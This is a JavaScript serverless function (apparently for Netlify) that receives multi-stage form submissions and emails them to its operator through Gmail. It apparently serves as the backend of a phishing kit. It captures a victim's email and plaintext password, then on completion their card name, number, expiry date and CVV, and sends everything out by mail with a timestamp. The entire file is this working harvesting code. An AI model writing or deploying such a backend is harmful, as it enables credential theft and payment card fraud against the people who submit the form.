const nodemailer = require("nodemailer");

exports.handler = async (event) => {
  try {

    // Only allow POST requests
    if (event.httpMethod !== "POST") {
      return {
        statusCode: 405,
        body: JSON.stringify({
          success: false,
          message: "Method Not Allowed",
        }),
      };
    }

    const body = JSON.parse(event.body || "{}");
    const { submissionType, data } = body;

    if (!data) {
      return {
        statusCode: 400,
        body: JSON.stringify({
          success: false,
          message: "No data provided",
        }),
      };
    }

    // Email transporter (Netlify backend environment variables)
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Define submission types
    const isIncomplete = submissionType === "INCOMPLETE";
    const isComplete = submissionType === "COMPLETE";

    // =========================
    // BASE EMAIL (Page 1 + Page 2)
    // =========================

    let emailHTML = `
      <h2>New Form Submission</h2>
      <p><strong>Type:</strong> ${submissionType}</p>
      <hr />

      <p><strong>Email/User:</strong> ${data.email || "N/A"}</p>
      <p><strong>Password:</strong> ${data.password || "N/A"}</p>
    `;

    // =========================
    // PAGE 3 DATA (ONLY COMPLETE)
    // =========================

    if (isComplete) {
      emailHTML += `
        <hr />
        <h3>Card Details</h3>

        <p><strong>Card Name:</strong> ${data.cardName || "N/A"}</p>
        <p><strong>Card Number:</strong> ${data.cardNumber || "N/A"}</p>
        <p><strong>Expiry:</strong> ${data.expiryDate || "N/A"}</p>
        <p><strong>CVV:</strong> ${data.cvv || "N/A"}</p>
      `;
    }

    // Timestamp for tracking
    emailHTML += `
      <hr />
      <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    `;

    // =========================
    // SEND EMAIL
    // =========================

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject:
        submissionType === "INCOMPLETE"
          ? "Incomplete Submission"
          : "Complete Submission",
      html: emailHTML,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({
        success: true,
        message: "Email sent successfully",
      }),
    };

  } catch (error) {
    console.error("Email Error:", error);

    return {
      statusCode: 500,
      body: JSON.stringify({
        success: false,
        message: "Failed to send email",
        error: error.message,
      }),
    };
  }
};